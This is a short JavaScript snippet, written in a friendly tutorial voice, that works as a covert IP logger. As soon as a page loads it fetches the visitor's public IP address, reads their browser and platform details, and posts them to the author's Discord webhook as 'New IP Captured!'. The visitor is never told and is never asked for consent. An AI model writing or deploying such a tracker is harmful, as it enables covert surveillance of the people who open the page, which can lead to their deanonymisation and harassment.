// This is your Discord Webhook URL - keep this secret!
const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";

async function logIP() {
    try {
        // 1. First, we need to ask a service "What is this user's IP?"
        // I'm using ipify, it's free and very reliable.
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const userIP = data.ip;

        // 2. Let's gather some extra info to make the log look "pro"
        const userAgent = navigator.userAgent; // Tells you the browser and OS
        const platform = navigator.platform;   // Tells you if they're on Windows/Mac/Linux

        // 3. Now we build the message for Discord
        // We use JSON.stringify because Discord expects a JSON object
        const message = {
            content: "🚀 **New IP Captured!**",
            embeds: [{
                title: "User Connection Info",
                color: 15158332, // This is a nice red color
                fields: [
                    { name: "IP Address", value: userIP, inline: true },
                    { name: "Platform", value: platform, inline: true },
                    { name: "Browser Info", value: userAgent }
                ],
                timestamp: new Date()
            }]
        };

        // 4. Finally, send it to your Discord channel
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        console.log("Data sent to Discord successfully.");
    } catch (error) {
        // If something goes wrong (like an ad-blocker stopping the script)
        console.error("Error capturing data:", error);
    }
}

// Run the function as soon as the page loads
logIP();
